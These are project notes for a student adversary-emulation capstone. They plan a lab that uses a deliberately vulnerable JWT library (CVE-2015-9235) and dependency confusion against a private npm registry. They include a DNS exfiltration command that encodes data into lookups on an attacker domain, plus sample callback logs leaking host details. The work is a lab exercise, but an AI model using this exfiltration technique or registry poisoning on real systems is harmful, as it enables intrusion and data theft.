# Notes and Initial Research

Notes template
```
Resources link:
Idea:
Notes:
```

Please try to stick to the above notes contribution template all though it's not necessary. Since we are in different timezones and remote, it's best to have organized notes.

I have protected the main branch, so any changes will have to go through a PR merge, and before every PR merge, we all (at least 2) will have to review it.

When committing please ensure to add an apt commit message.

## Scenario
This project is intended to apply the MITRE ATT&CK framework and tools to map a cyber incident and then use the Caldera tool to complete an emulation plan. Included into team's tasks is the deployment in the Cloud of a mock-up scenario that represents the system compromised in the cyberincident studied. 

As a result of the project, with the Adversary Emulation Plan is needed to elaborate Threat Report of the incident analized (including a STIX2.1 JSON representation).  


## Dev Env

Resource Link: https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610

Idea: Build an infrastructure for an organization that heavily relies on a JavaScript environment, which can be utilized for implementing Dependency Confusion.

Notes: 

Requirements: 
`2` WebServers each with:

```
RAM: 4GB or more
Storage: Min
```

### Dev-Server-1

```bash
Node: v18.11.0
npm: v8.19.2
pm2: 5.2.2

# The versions can change depending on the time of implementation
```

This would be our ginny pig application, which would have standard features of a generic web-application. Ex: Authentication and messaging (static)

The authentication will be handled using a vulnerable JWT tokens. We plan on using `jsonwebtoken v0.4.0` which will be vulnerable to token signing vulnerability ([CVE-2015-9235](https://nvd.nist.gov/vuln/detail/CVE-2015-9235)). 

```diff 
- Critical issue 1 (Account Takeover)
+ CVSS: 3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
```

> **Note**  
> STEP1: This will allows us to do perform an account takeover of the admin account, from here we will leak about the source code and name of a private package called: \<private-package-name>



### Dev-Server-2

```bash
Node: v18.11.0
npm: v8.19.2
pm2: v5.2.2
verdaccio: v5.20.1
# The versions can change depending on the time of implementation
```

This will be the internal package managing service like NPM. We will be using [Verdaccio](https://www.npmjs.com/package/verdaccio) for this server.

This is where the internal package will be hosted.

> When the attack will unfold, it will also poison this repository with our malicious package.

```diff 
- High/Critical issue 2
+ CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
# depends based on the amount of compromise a company incurs 
```

> **Note**  
> STEP2: This will allows us to get back a call back over the DNS and/or HTTP requests.


## Attacker Env

This is a separate env from that of Dev, and will require us to `2` server (or `1`) and a domain name get to call backs on.

Requirements: 
`2` WebServers each with:

```
RAM: 4GB or more
Storage: Min
```

Domain name : 
Can be bought from Namecheap for free using the .edu account.

### Attacker-Server-1 

DNS server which will receive call backs based on the domain look ups
(We can use something like: [Bind9](https://www.isc.org/bind/))

Ex of a DNS callback to my own hacker-server
```bash
nslookup $(echo -n "Capstone-test" | openssl base64).X-hacker-X-hackerone.me
Server:         XXXX:XXX:feed::1
Address:        XXXX:XXX:feed::1#53

Non-authoritative answer:
Name:   Q2Fwc3RvbmUtdGVzdA==.X-hacker-X-hackerone.me
Address: <redacted>

### As received on my hacker-server

03-Feb-2023 10:49:16.277 queries: info: client @0x7f61f402a880 <IP-Address>#17232 (Q2Fwc3RvbmUtdGVzdA==.X-hacker-X-hackerone.me): query: Q2Fwc3RvbmUtdGVzdA==.X-hacker-X-hackerone.me IN A -E(0)D (IP-Address)
```

> We are encoding the output with base-64 because of character restrictions for domain-name.

### Attacker-server-2 (Optional)

Instead of having a dedicated server, we can also have a web-hook to receive HTTP call backs:

```h
The path: <path>, Version: Linux kali 5.10.0-kali3-amd64 #1 SMP Debian 5.10.13-1kali1 (2021-02-08) x86_64 GNU/Linux ID: uid=1000(kali) gid=1000(kali) groups=1000(kali),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),119(bluetooth),133(scanner),141(kaboxer), IP: <redacted>, Internal IP: 10.0.0.20 172.17.0.1 2601:197:801:2040::7aa 2601:197:801:2040:4d98:e828:740e:c72c 2601:197:801:2040:20c:29ff:febb:36a5 , Tag: altl
```

or we can use [ngrok](https://ngrok.com/) to receive call-backs on our system which can be on our own computers.



